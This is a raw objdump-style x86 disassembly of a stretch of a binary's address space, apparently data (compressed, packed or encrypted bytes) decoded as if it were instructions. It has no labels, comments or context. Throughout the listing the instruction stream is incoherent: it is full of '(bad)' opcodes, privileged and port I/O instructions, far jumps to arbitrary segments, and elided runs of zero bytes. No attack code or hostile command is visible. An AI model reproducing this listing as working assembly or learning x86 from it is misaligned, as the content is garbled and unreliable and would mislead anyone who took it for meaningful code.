  42a98a:	stos   BYTE PTR es:[edi],al
  42a98b:	cmc    
  42a98c:	stos   BYTE PTR es:[edi],al
  42a98d:	cmp    ah,ch
  42a98f:	fwait
  42a990:	ss in  al,0xe4
  42a993:	les    esi,FWORD PTR [edx]
  42a995:	dec    edx
  42a996:	xchg   ecx,eax
  42a997:	or     al,0x6d
  42a999:	aaa    
  42a99a:	cs test al,0x54
  42a99d:	push   esp
  42a99e:	rol    DWORD PTR [ebp+0x48],0x2d
  42a9a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9a3:	mov    ebp,0x9c1a1337
  42a9a8:	lock lds esi,FWORD PTR [edx]
  42a9ab:	gs out dx,eax
  42a9ad:	fcomp  QWORD PTR [edi+0x43]
  42a9b0:	shl    BYTE PTR [ebx+ebp*2],1
  42a9b3:	adc    eax,edi
  42a9b5:	ss inc ebx
  42a9b7:	and    BYTE PTR ds:0xffb7395f,dl
  42a9bd:	add    al,0x65
  42a9bf:	mov    bh,0x12
	...
  42aa31:	add    BYTE PTR [eax],al
  42aa33:	add    dh,cl
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	hlt    
  42aa41:	aad    0x37
  42aa43:	pop    eax
  42aa44:	xchg   esp,eax
  42aa45:	ret    
  42aa46:	add    DWORD PTR [eax],eax
  42aa48:	cmc    
  42aa49:	add    BYTE PTR [eax],al
  42aa4b:	add    BYTE PTR [eax],bl
  42aa4d:	call   0x1d61aabd
  42aa52:	int3   
  42aa53:	mov    cl,0x4a
  42aa55:	in     al,0xb5
  42aa57:	rol    DWORD PTR [eax+0x78ac22c2],1
  42aa5d:	and    DWORD PTR [ecx],0xfffffffa
  42aa60:	lods   eax,DWORD PTR ds:[esi]
  42aa61:	pop    ds
  42aa62:	(bad)  
  42aa63:	sbb    ebx,DWORD PTR [esi-0x10ad9a8b]
  42aa69:	and    DWORD PTR [ebx+ebx*2-0x2],edx
  42aa6d:	xchg   ebp,eax
  42aa6e:	sbb    ah,BYTE PTR [esp+eiz*2-0x2adba3fa]
  42aa75:	inc    esi
  42aa76:	jge    0x42aa57
  42aa78:	mul    WORD PTR [esi-0x35dc4acc]
  42aa7f:	test   al,0xe7
  42aa81:	push   cs
  42aa82:	xchg   ebp,eax
  42aa83:	in     al,dx
  42aa84:	cmc    
  42aa85:	adc    dl,bh
  42aa87:	mov    eax,ds:0xed1fbc8a
  42aa8c:	invd   
  42aa8e:	sbb    DWORD PTR [edi+edi*4],eax
  42aa91:	rcr    ecx,1
  42aa93:	fs xchg ebp,eax
  42aa95:	dec    esi
  42aa96:	or     BYTE PTR [edx+0x47c980a5],cl
  42aa9c:	ror    esi,1
  42aa9e:	inc    edx
  42aa9f:	xchg   DWORD PTR [edi],ecx
  42aaa1:	mov    bh,0xbe
  42aaa3:	pop    ebx
  42aaa4:	xor    DWORD PTR [ecx-0x178ef58c],eax
  42aaaa:	jmp    0xc23f254c
  42aaaf:	cs das 
  42aab1:	xor    al,0xbf
  42aab3:	sub    BYTE PTR [ebx+0x48],0x60
  42aab7:	or     al,0x3a
  42aab9:	repz out dx,eax
  42aabb:	loop   0x42aaed
  42aabd:	out    0xb3,eax
  42aabf:	bound  esp,QWORD PTR [ebp-0x54]
  42aac2:	pop    ds
  42aac3:	enter  0x7e2c,0xcd
  42aac7:	xchg   DWORD PTR [esp+eax*8],ebp
  42aaca:	mov    WORD PTR [edi-0x10],?
  42aacd:	ror    DWORD PTR ds:0x93584255,1
  42aad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aad4:	clc    
  42aad5:	lock push esp
  42aad7:	test   DWORD PTR [esi-0x4b],eax
  42aada:	std    
  42aadb:	inc    esi
  42aadc:	ret    0x911d
  42aadf:	mov    ?,edx
  42aae1:	adc    BYTE PTR [ebp+0x2e2c2e1c],dl
  42aae7:	daa    
  42aae8:	mov    dh,0xe8
  42aaea:	mov    al,0x59
  42aaec:	sub    DWORD PTR [esi],0xfffffff9
  42aaef:	mov    ds:0x885c8840,eax
  42aaf4:	push   0x49
  42aaf6:	jle    0x42aaca
  42aaf8:	mov    dh,BYTE PTR [esi-0x2e]
  42aafb:	adc    bl,BYTE PTR [ecx+0x1b265733]
  42ab01:	adc    ebx,DWORD PTR [edx]
  42ab03:	push   edx
  42ab04:	hlt    
  42ab05:	lods   al,BYTE PTR ds:[esi]
  42ab06:	cmp    DWORD PTR [ebp-0x23aa193a],edi
  42ab0c:	xor    al,BYTE PTR [ecx+0x7005fcf3]
  42ab12:	iret   
  42ab13:	js     0x42ab34
  42ab15:	clc    
  42ab16:	jp     0x42aaa6
  42ab18:	mov    ah,0x4d
  42ab1a:	pop    eax
  42ab1b:	pop    esp
  42ab1c:	sbb    DWORD PTR [esi],edx
  42ab1e:	neg    DWORD PTR [ebp-0x702fd0c4]
  42ab24:	mov    ebx,0x5b22a68b
  42ab29:	sbb    cl,BYTE PTR [ebx+0x3e]
  42ab2c:	test   al,0x33
  42ab2e:	jl     0x42aad6
  42ab30:	mov    dh,0x5b
  42ab32:	dec    ebx
  42ab33:	lods   eax,DWORD PTR ds:[esi]
  42ab34:	call   0x38c12f85
  42ab39:	ss and edx,esi
  42ab3c:	add    DWORD PTR [ebx],edi
  42ab3e:	xchg   esp,eax
  42ab3f:	fidivr WORD PTR [ebx+0x0]
	...
  42abb2:	add    BYTE PTR [eax],al
  42abb4:	mov    ds:0xb788a616,eax
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	xchg   edx,eax
  42abc1:	jle    0x42ac1f
  42abc3:	cmp    eax,0x1c489
  42abc8:	cmc    
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    BYTE PTR [edi+0x717cec69],al
  42abd1:	cld    
  42abd2:	pop    edx
  42abd3:	pushf  
  42abd4:	cdq    
  42abd5:	dec    ebx
  42abd6:	xlat   BYTE PTR ds:[ebx]
  42abd7:	inc    edx
  42abd8:	cwde   
  42abd9:	mov    dl,0x67
  42abdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42abdc:	aaa    
  42abdd:	test   al,0xff
  42abdf:	jg     0x42ac0a
  42abe1:	jge    0x42ab84
  42abe3:	mov    WORD PTR [ecx+edi*4-0x1318d2f8],fs
  42abea:	sub    BYTE PTR [ecx+edi*2-0x12],dh
  42abee:	or     al,0xdd
  42abf0:	das    
  42abf1:	xor    ah,BYTE PTR [ecx]
  42abf3:	xchg   BYTE PTR ds:0x7fcaa12d,dh
  42abf9:	adc    DWORD PTR [edx-0xe532329],0xffffff86
  42ac00:	clc    
  42ac01:	scas   al,BYTE PTR es:[edi]
  42ac02:	(bad)  [ecx]
  42ac04:	lods   al,BYTE PTR ds:[esi]
  42ac05:	dec    ecx
  42ac06:	mov    ebx,0x1fe25e38
  42ac0b:	sbb    DWORD PTR [esi-0x55029d15],ecx
  42ac11:	or     eax,0x9a73597d
  42ac16:	add    al,0x8f
  42ac18:	push   ebx
  42ac19:	bound  ecx,QWORD PTR [edx+ecx*4+0x3650bbf2]
  42ac20:	dec    edi
  42ac21:	jno    0x42abf9
  42ac23:	and    eax,0x6cd0340a
  42ac28:	mov    ch,0x58
  42ac2a:	mov    cl,ah
  42ac2c:	mov    WORD PTR [ebx],cs
  42ac2e:	mov    al,0xe0
  42ac30:	push   edx
  42ac31:	clc    
  42ac32:	push   ebp
  42ac33:	push   ss
  42ac34:	push   ecx
  42ac35:	mov    eax,0x83e26022
  42ac3a:	call   0xc2f4770d
  42ac3f:	mov    ds:0x2dcffc25,al
  42ac44:	sbb    DWORD PTR [esi+0x4e],edi
  42ac47:	mov    esi,0x65d40bf1
  42ac4c:	lock mov esi,ebp
  42ac4f:	(bad)  [esi+ebx*4]
  42ac52:	std    
  42ac53:	cli    
  42ac54:	xor    bl,BYTE PTR [eax]
  42ac56:	in     al,0xa3
  42ac58:	mov    ch,0x1e
  42ac5a:	hlt    
  42ac5b:	inc    eax
  42ac5c:	(bad)  
  42ac5e:	xor    bh,dl
  42ac60:	adc    DWORD PTR [edi+0x233e998e],edx
  42ac66:	push   ecx
  42ac67:	jmp    0x5914:0xb1b95ade
  42ac6e:	push   edx
  42ac6f:	adc    BYTE PTR [ecx],bl
  42ac71:	and    BYTE PTR [edx-0x3c],bl
  42ac74:	test   DWORD PTR [eax+eiz*2+0x580a8856],ecx
  42ac7b:	and    dl,BYTE PTR [ecx-0x17]
  42ac7e:	into   
  42ac7f:	jp     0x42ac14
  42ac81:	jmp    0xee26:0x53b1c9f9
  42ac88:	and    eax,DWORD PTR [ebp+0x57]
  42ac8b:	inc    eax
  42ac8c:	fistp  DWORD PTR ds:0x4acf7694
  42ac92:	push   edi
  42ac93:	in     al,0x85
  42ac95:	push   ds
  42ac96:	mov    al,ds:0x49da0104
  42ac9b:	test   eax,0x7c94efae
  42aca0:	sbb    DWORD PTR [eax+edx*8-0x49],0xffffffc8
  42aca5:	mov    ecx,0xa9e32a8a
  42acaa:	xchg   ebp,eax
  42acab:	addr16 pop ss
  42acad:	shl    ebp,1
  42acaf:	xchg   ebx,ecx
  42acb1:	jns    0x42accd
  42acb3:	(bad)  
  42acb4:	jge    0x42ad0a
  42acb6:	sti    
  42acb7:	mov    eax,0x9df07df3
  42acbc:	mov    dl,0x93
  42acbe:	mov    esp,0x86e6
	...
  42ad33:	add    BYTE PTR [ebx-0x13f33b49],bl
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	psubb  mm0,QWORD PTR [ebp+ebx*2+0x1c57eab]
  42ad47:	add    ch,dh
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    BYTE PTR [ecx+eax*1-0x5f],al
  42ad4f:	into   
  42ad50:	pop    ecx
  42ad51:	cwde   
  42ad52:	ret    0x801f
  42ad55:	in     eax,dx
  42ad56:	lock pusha 
  42ad58:	mov    dh,BYTE PTR [edx]
  42ad5a:	les    ebp,FWORD PTR [edi-0x6b]
  42ad5d:	cdq    
  42ad5e:	repnz ss std 
  42ad61:	ins    BYTE PTR es:[edi],dx
  42ad62:	add    al,0x13
  42ad64:	adc    esp,ecx
  42ad66:	xchg   ebp,eax
  42ad67:	dec    edi
  42ad68:	gs mov bh,0x2d
  42ad6b:	sbb    ch,BYTE PTR [esi+ecx*1-0x5b99eb2b]
  42ad72:	out    dx,eax
  42ad73:	jmp    0xe01430dd
  42ad78:	add    ah,bh
  42ad7a:	iret   
  42ad7b:	loop   0x42ad8b
  42ad7d:	loopne 0x42adcd
  42ad7f:	mov    esp,esi
  42ad81:	cmp    DWORD PTR [ebx],edx
  42ad83:	dec    eax
  42ad84:	dec    esi
  42ad85:	dec    edi
  42ad86:	pop    esi
  42ad87:	popa   
  42ad88:	aam    0x44
  42ad8a:	and    BYTE PTR [ebx],dl
  42ad8c:	jecxz  0x42ad10
  42ad8e:	xchg   edi,eax
  42ad8f:	xor    eax,0xffffffde
  42ad92:	ja     0x42ad43
  42ad94:	mov    DWORD PTR [edi+0x5e18708d],ecx
  42ad9a:	icebp  
  42ad9b:	cmp    bl,BYTE PTR [ebx-0x7b]
  42ad9e:	repnz push ebx
  42ada0:	xchg   ebx,eax
  42ada1:	mov    esp,0xdf93166a
  42ada6:	xchg   ebp,ebp
  42ada8:	mov    edi,0x2b78f584
  42adad:	add    cl,ch
  42adaf:	jo     0x42adb0
  42adb1:	call   0xf804a93
  42adb6:	fisttp QWORD PTR [ecx]
  42adb8:	jmp    0x43961a2b
  42adbd:	outs   dx,BYTE PTR ds:[esi]
  42adbe:	mov    bh,dl
  42adc0:	push   es
  42adc1:	pusha  
  42adc2:	mov    bl,0xdb
  42adc4:	sbb    edx,DWORD PTR [ebp+edi*4-0x882f842]
  42adcb:	sbb    DWORD PTR [esi+eax*4-0x79],ecx
  42adcf:	jmp    DWORD PTR [ebx]
  42add1:	mov    ch,0x88
  42add3:	fnstenv [ebp+eax*4+0xf]
  42add7:	or     ebx,esp
  42add9:	or     ah,cl
  42addb:	in     al,0x7d
  42addd:	cmp    ebp,DWORD PTR [ebp+0x6b]
  42ade0:	int    0x35
  42ade2:	test   BYTE PTR ds:0x8366a6e6,0x6c
  42ade9:	daa    
  42adea:	push   ebp
  42adeb:	fist   DWORD PTR [esi]
  42aded:	lahf   
  42adee:	mov    dh,cl
  42adf0:	popa   
  42adf1:	sbb    DWORD PTR [edx-0x7098a5d0],ebp
  42adf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42adf8:	cmc    
  42adf9:	pop    ds
  42adfa:	pop    ebp
  42adfb:	and    al,0x9d
  42adfd:	and    BYTE PTR [edx-0x49b5882],0x49
  42ae04:	jne    0x42ae69
  42ae06:	outs   dx,BYTE PTR ds:[esi]
  42ae07:	xlat   BYTE PTR ds:[ebx]
  42ae08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae09:	dec    BYTE PTR ds:0x6caad034
  42ae0f:	repnz scas al,BYTE PTR es:[edi]
  42ae11:	mov    ebp,0x681e9e1e
  42ae16:	daa    
  42ae17:	xor    eax,0xe300ab11
  42ae1c:	cmp    al,0x81
  42ae1e:	xchg   edx,eax
  42ae1f:	scas   al,BYTE PTR es:[edi]
  42ae20:	push   0x45
  42ae22:	orps   xmm6,XMMWORD PTR [ebx]
  42ae25:	les    ebx,FWORD PTR [esi]
  42ae27:	xchg   ebx,eax
  42ae28:	int3   
  42ae29:	int    0xa1
  42ae2b:	jns    0x42aea4
  42ae2d:	xor    BYTE PTR [edx-0x13d9120c],dh
  42ae33:	mov    ch,0x96
  42ae35:	into   
  42ae36:	(bad)
  42ae39:	sbb    DWORD PTR [edx-0x67],esp
  42ae3c:	inc    ecx
  42ae3d:	sub    al,0x9c
  42ae3f:	xor    esp,eax
	...
  42aeb1:	add    BYTE PTR [eax],al
  42aeb3:	add    BYTE PTR [ecx],dh
  42aeb5:	inc    ebp
  42aeb6:	enter  0xfc06,0x8f
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	ss enter 0x255e,0x73
  42aec5:	mov    BYTE PTR [ecx],0x0
  42aec8:	cmc    
  42aec9:	add    BYTE PTR [eax],al
  42aecb:	add    BYTE PTR [ebx],dl
  42aecd:	mov    bh,0x55
  42aecf:	dec    edi
  42aed0:	aaa    
  42aed1:	imul   ebx,DWORD PTR [ebx+0x1986c476],0xffffffb4
  42aed8:	or     DWORD PTR [ecx+0x47c9d2ee],ebx
  42aede:	mov    ?,WORD PTR ds:0x3543dea
  42aee4:	jmp    0x5d63:0x42c9877
  42aeeb:	pop    edx
  42aeec:	xor    al,0xee
  42aeee:	push   edi
  42aeef:	or     BYTE PTR ds:0x816ddea2,dl
  42aef5:	loopne 0x42aef3
  42aef7:	adc    edx,DWORD PTR [ecx+0x149d9202]
  42aefd:	xchg   ebp,eax
  42aefe:	(bad)  
  42aeff:	fs clc 
  42af01:	lea    edx,[ecx]
  42af03:	inc    edi
  42af04:	push   ecx
  42af05:	or     eax,0xe4ca5249
  42af0a:	aam    0x44
  42af0c:	addr16 cmp al,0x63
  42af0f:	cmp    DWORD PTR [ebx+0x78],esp
  42af12:	jmp    0x102bc53a
  42af17:	lahf   
  42af18:	and    DWORD PTR [ecx+0x63],edx
  42af1b:	add    esi,DWORD PTR [esi+0x7495935a]
  42af21:	js     0x42aecf
  42af23:	mov    dl,dl
  42af25:	icebp  
  42af26:	jge    0x42aed5
  42af28:	inc    esp
  42af29:	call   0xeeab:0x6880e22b
  42af30:	xchg   esp,eax
  42af31:	dec    eax
  42af33:	test   BYTE PTR [ebx],cl
  42af35:	jp     0x42af52
  42af37:	or     DWORD PTR [edx+eax*2],edx
  42af3a:	and    DWORD PTR [eax+0x73],eax
  42af3d:	cmp    al,0x4
  42af3f:	out    0xd5,eax
  42af41:	sub    al,BYTE PTR [ecx+eax*1]
  42af44:	cmp    al,bh
  42af46:	inc    edx
  42af47:	loop   0x42af23
  42af49:	or     ebx,DWORD PTR [ebx]
  42af4b:	jae    0x42af91
  42af4d:	sbb    al,0xaf
  42af4f:	jne    0x42aed9
  42af51:	js     0x42aefd
  42af53:	jmp    0xf223:0x9ed9f190
  42af5a:	clc    
  42af5b:	pop    ebp
  42af5c:	xlat   BYTE PTR ds:[ebx]
  42af5d:	imul   ebp,DWORD PTR [edx+esi*1],0x28
  42af61:	xchg   edx,eax
  42af62:	pop    ebp
  42af63:	mov    bl,0x66
  42af65:	test   BYTE PTR [ecx+0x480d6440],cl
  42af6b:	xchg   esi,eax
  42af6c:	js     0x42af34
  42af6e:	and    bh,ah
  42af70:	repz xchg esp,eax
  42af72:	sbb    ch,dh
  42af74:	adc    al,0xc4
  42af76:	cdq    
  42af77:	scas   al,BYTE PTR es:[edi]
  42af78:	in     al,0x7a
  42af7a:	out    0x4a,al
  42af7c:	out    dx,eax
  42af7d:	push   edx
  42af7e:	mov    ecx,0x456fdaab
  42af83:	xor    DWORD PTR [edx+0x30],edi
  42af86:	dec    edi
  42af87:	(bad)  
  42af88:	out    0x81,eax
  42af8a:	jmp    0x42af12
  42af8c:	mov    edi,0x38bae70
  42af91:	inc    eax
  42af92:	xlat   BYTE PTR ds:[ebx]
  42af93:	xchg   ebx,eax
  42af94:	rep outs dx,BYTE PTR ds:[esi]
  42af96:	mov    ah,al
  42af98:	push   es
  42af99:	gs test al,0x51
  42af9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af9d:	je     0x42af5b
  42af9f:	pop    eax
  42afa0:	cld    
  42afa1:	into   
  42afa2:	mov    fs,WORD PTR [edx-0x2f]
  42afa5:	test   al,0x4d
  42afa7:	imul   esi,DWORD PTR [eax+0x41],0xffffffcc
  42afab:	mov    al,ds:0x32289370
  42afb0:	mov    ah,0xec
  42afb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42afb3:	xor    bl,BYTE PTR [ecx+eax*8]
  42afb6:	outs   dx,BYTE PTR ds:[esi]
  42afb7:	xchg   ecx,eax
  42afb8:	fstp   QWORD PTR [ecx+0x6df5945d]
  42afbe:	aas    
  42afbf:	pop    ebx
  42afc0:	or     eax,0x0
	...
  42b031:	add    BYTE PTR [eax],al
  42b033:	add    bh,dl
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0xef29
  42b042:	fiadd  WORD PTR [eax]
  42b044:	push   0xf50001c7
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    ah,al
  42b04d:	retw   0xf60a
  42b051:	and    eax,0x92dbfa56
  42b056:	shl    BYTE PTR [eax-0x65c45fa9],cl
  42b05c:	(bad)  
  42b05d:	call   0xb99a:0x8c7cd6bd
  42b064:	mov    ebp,0xd2e144a3
  42b069:	mov    eax,fs
  42b06b:	(bad)  
  42b06c:	imul   DWORD PTR [edx]
  42b06e:	aad    0xc5
  42b070:	mov    bh,0x94
  42b072:	mov    ah,0x3e
  42b074:	push   cs
  42b075:	pop    ss
  42b076:	mov    esp,0xb16c8505
  42b07b:	push   edi
  42b07c:	mov    al,0x26
  42b07e:	cmc    
  42b07f:	in     eax,0x32
  42b081:	mov    edx,0x3915e66b
  42b086:	pop    edx
  42b087:	fcmovnbe st,st(1)
  42b089:	cmp    al,0x62
  42b08b:	sub    DWORD PTR [edx+ebx*2+0xc],ecx
  42b08f:	adc    eax,0xb57aae19
  42b094:	daa    
  42b095:	je     0x42b0bd
  42b097:	push   eax
  42b098:	or     DWORD PTR [ecx],ebx
  42b09a:	gs js  0x42b045
  42b09d:	inc    ebx
  42b09e:	cld    
  42b09f:	push   esp
  42b0a0:	add    edx,DWORD PTR [eax-0xc342678]
  42b0a6:	mov    esi,0x42e49a09
  42b0ab:	scas   al,BYTE PTR es:[di]
  42b0ad:	sbb    BYTE PTR [eax+0x2d45f657],al
  42b0b3:	cs xchg ebx,eax
  42b0b5:	fld    DWORD PTR [ebx+0x4]
  42b0b8:	repnz adc BYTE PTR [esi+0x1ba38452],ch
  42b0bf:	popf   
  42b0c0:	(bad)  
  42b0c1:	ror    DWORD PTR ds:0x458d0e4,cl
  42b0c7:	pop    ss
  42b0c8:	mov    bh,0xbb
  42b0ca:	jnp    0x42b0b7
  42b0cc:	xchg   BYTE PTR [esi+0x9],bh
  42b0cf:	xor    esp,DWORD PTR [esi]
  42b0d1:	pop    ebp
  42b0d2:	push   cs
  42b0d3:	in     eax,0xc3
  42b0d5:	ins    DWORD PTR es:[edi],dx
  42b0d6:	push   0x8
  42b0d8:	ins    DWORD PTR es:[edi],dx
  42b0d9:	add    BYTE PTR [esi],al
  42b0db:	call   0x331728fd
  42b0e0:	mov    ebp,0xfecdecd5
  42b0e5:	ja     0x42b090
  42b0e7:	mov    al,0x71
  42b0e9:	ins    BYTE PTR es:[edi],dx
  42b0ea:	fist   WORD PTR [esi+0x4e5cc72e]
  42b0f0:	jns    0x42b077
  42b0f2:	jp     0x42b149
  42b0f4:	sbb    dh,dh
  42b0f6:	ds mov eax,0x1649b1d0
  42b0fc:	xor    edi,ecx
  42b0fe:	outs   dx,BYTE PTR ds:[esi]
  42b0ff:	fs icebp 
  42b101:	xor    BYTE PTR [ebx-0x36addb7d],al
  42b107:	(bad)  
  42b108:	call   0x55864b86
  42b10d:	lds    edi,FWORD PTR ds:0xcd0f285e
  42b113:	jnp    0x42b14c
  42b115:	add    BYTE PTR [eax-0x27],bl
  42b118:	gs fdiv st(5),st
  42b11b:	adc    dl,BYTE PTR [esi-0x36]
  42b11e:	xchg   BYTE PTR [edx],dl
  42b120:	inc    esp
  42b121:	shl    BYTE PTR ds:0xe7256b9b,cl
  42b127:	pop    ecx
  42b128:	jmp    0x78e0963e
  42b12d:	test   eax,0xa7a306e1
  42b132:	(bad)  
  42b134:	mov    edx,0x7aa4b7a8
  42b139:	push   0xa07f9dfa
  42b13e:	pusha  
  42b13f:	es cld 
	...
  42b1b1:	add    BYTE PTR [eax],al
  42b1b3:	add    BYTE PTR [ebx],ch
  42b1b5:	test   DWORD PTR [ebp-0x50e640e7],edx
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	or     DWORD PTR [edi+0x10],edx
  42b1c3:	jno    0x42b222
  42b1c5:	enter  0x1,0xf5
  42b1c9:	add    BYTE PTR [eax],al
  42b1cb:	add    dl,cl
  42b1cd:	scas   al,BYTE PTR es:[edi]
  42b1ce:	leave  
  42b1cf:	mov    edx,0x3566ef69
  42b1d4:	mov    edx,DWORD PTR [edx]
  42b1d6:	mov    esi,0x2c16cf6e
  42b1db:	inc    esp
  42b1dc:	dec    edi
  42b1dd:	xor    al,0x8b
  42b1df:	ins    DWORD PTR es:[edi],dx
  42b1e0:	ret    0x4bc0
  42b1e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b1e4:	adc    DWORD PTR [esi],0xffffffd2
  42b1e7:	out    dx,al
  42b1e8:	retf   
  42b1e9:	xchg   DWORD PTR ds:0xe2641b74,edx
  42b1ef:	repnz inc esi
  42b1f1:	jbe    0x42b1f6
  42b1f3:	jge    0x42b177
  42b1f5:	loop   0x42b1a8
  42b1f7:	jmp    0x1a13:0x65506329
  42b1fe:	cli    
  42b1ff:	push   esi
  42b200:	test   al,0xb9
  42b202:	pushf  
  42b203:	mov    cl,BYTE PTR [edx-0x564645ba]
  42b209:	ins    BYTE PTR es:[edi],dx
  42b20a:	(bad)  [ebx-0x73a7823a]
  42b210:	xor    BYTE PTR [ebp+edx*2-0x5ba824b2],dl
  42b217:	lods   eax,DWORD PTR ds:[esi]
  42b218:	jb     0x42b230
  42b21a:	xchg   esp,eax
  42b21b:	inc    edx
  42b21c:	out    dx,al
  42b21d:	fbstp  TBYTE PTR [esp+ecx*4-0x6c]
  42b221:	and    eax,ebx
  42b223:	loop   0x42b267
  42b225:	scas   al,BYTE PTR es:[edi]
  42b226:	xchg   ebx,eax
  42b227:	fs jle 0x42b1f5
  42b22a:	ja     0x42b1dc
  42b22c:	jae    0x42b27b
  42b22e:	js     0x42b21d
  42b230:	sbb    edx,edx
  42b232:	mov    dl,0x86
  42b234:	xchg   esp,eax
  42b235:	(bad)  
  42b236:	arpl   bp,ax
  42b238:	aas    
  42b239:	push   ebp
  42b23a:	jnp    0x42b1bc
  42b23c:	add    ecx,DWORD PTR [ebx+0x362fec46]
  42b242:	scas   al,BYTE PTR es:[edi]
  42b243:	push   es
  42b244:	std    
  42b245:	push   es
  42b246:	ret    0xb0cf
  42b249:	adc    ecx,DWORD PTR [ebp*4+0x4c88656f]
  42b250:	cdq    
  42b251:	and    edi,ebx
  42b253:	scas   eax,DWORD PTR es:[edi]
  42b254:	dec    esi
  42b255:	xchg   ecx,eax
  42b256:	jbe    0x42b293
  42b258:	add    eax,0x47006d31
  42b25d:	imul   edx,DWORD PTR [ecx+eax*1],0x25
  42b261:	(bad)  
  42b262:	push   eax
  42b263:	xor    ecx,0x256445fe
  42b269:	bound  edi,QWORD PTR [esi-0x38ef8906]
  42b26f:	imul   eax,DWORD PTR [eax],0xfffffff2
  42b272:	mov    ecx,0xbfbb11c2
  42b277:	loope  0x42b2eb
  42b279:	inc    edx
  42b27a:	ficomp DWORD PTR [edi+0x3d8ca646]
  42b280:	cmp    DWORD PTR [eax+0x29fdb152],ecx
  42b286:	and    ecx,DWORD PTR [bp+si-0x4798]
  42b28b:	arpl   WORD PTR [ebx*4-0x58ad1eb3],dx
  42b292:	(bad)  
  42b295:	les    eax,FWORD PTR [ebx-0x3d]
  42b298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b299:	fild   DWORD PTR [edi+0x5f9eaafb]
  42b29f:	jle    0x42b2d0
  42b2a1:	test   eax,0x3334dd36
  42b2a6:	adc    ah,BYTE PTR [ebp+0x58710c92]
  42b2ac:	test   DWORD PTR [esi],0x9c299e94
  42b2b2:	imul   eax,DWORD PTR [ecx+0x10],0x44
  42b2b6:	test   eax,0x54569e91
  42b2bb:	jmp    0x2a788ed1
  42b2c0:	push   esi
	...
  42b331:	add    BYTE PTR [eax],al
  42b333:	add    BYTE PTR [edi+0xe],bh
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax-0x4a],esi
  42b341:	test   DWORD PTR [eax],ebp
  42b343:	add    al,0x52
  42b345:	leave  
  42b346:	add    DWORD PTR [eax],eax
  42b348:	cmc    
  42b349:	add    BYTE PTR [eax],al
  42b34b:	add    BYTE PTR [ebx-0x5a],ch
  42b34e:	add    al,0x4d
  42b350:	mov    ecx,DWORD PTR [ecx]
  42b352:	dec    edi
  42b353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b354:	mov    ds:0x1a38947f,al
  42b359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b35a:	iret   
  42b35b:	xor    bh,0x17
  42b35e:	pop    ebx
  42b35f:	rcr    esp,cl
  42b361:	jae    0x42b33f
  42b363:	loopne 0x42b3df
  42b365:	fcomi  st,st(4)
  42b367:	out    0xe5,eax
  42b369:	mov    edi,0xea8e8bd0
  42b36e:	ret    0xa8d6
  42b371:	or     edi,DWORD PTR [ebx+0x6c]
  42b374:	add    DWORD PTR [esi-0x3a],edi
  42b377:	mov    edi,0x6b01b542
  42b37c:	dec    ebx
  42b37d:	popf   
  42b37e:	jbe    0x42b322
  42b380:	mov    ebx,0x95fc3400
  42b385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b386:	ins    DWORD PTR es:[edi],dx
  42b387:	mov    ebx,0x3d223008
  42b38c:	xor    eax,0xd1451739
  42b391:	dec    esp
  42b392:	jecxz  0x42b3dc
  42b394:	inc    esi
  42b395:	dec    eax
  42b396:	pop    esp
  42b397:	pop    es
  42b398:	setg   dh
  42b39b:	mov    esp,0xc1d8298c
  42b3a0:	arpl   WORD PTR [ecx+0x54],sp
  42b3a3:	lods   al,BYTE PTR ds:[esi]
  42b3a4:	sahf   
  42b3a5:	xor    eax,DWORD PTR [edx]
  42b3a7:	adc    BYTE PTR [esi-0x3f],bl
  42b3aa:	and    DWORD PTR [esi],0x8874d30
  42b3b0:	in     al,dx
  42b3b1:	or     edx,eax
  42b3b3:	call   0x4a838414
  42b3b8:	push   ss
  42b3b9:	out    0xb2,eax
  42b3bb:	(bad)  
  42b3bc:	xchg   esp,eax
  42b3bd:	sub    BYTE PTR [ebp+0x5],0xd9
  42b3c1:	mov    DWORD PTR [edi-0x12],esp
  42b3c4:	dec    ecx
  42b3c5:	ss (bad) 
  42b3c7:	cwde   
  42b3c8:	in     eax,0x9
  42b3ca:	xlat   BYTE PTR ds:[ebx]
  42b3cb:	jmp    0x9bd798ad
  42b3d0:	cmp    edx,edi
  42b3d2:	inc    ecx
  42b3d3:	xchg   DWORD PTR [ebx+ecx*1+0x2e3ff452],esp
  42b3da:	xchg   edx,eax
  42b3db:	adc    al,0x36
  42b3dd:	(bad)  [esi+0x63b6c1a6]
  42b3e3:	mov    edx,0xa9a66c0
  42b3e8:	xor    esp,ebx
  42b3ea:	(bad)  
  42b3eb:	sub    eax,DWORD PTR [eax-0x2bf1260]
  42b3f1:	inc    ecx
  42b3f2:	(bad)  
  42b3f3:	out    dx,al
  42b3f4:	and    esi,ebx
  42b3f6:	out    dx,eax
  42b3f7:	pusha  
  42b3f8:	push   ecx
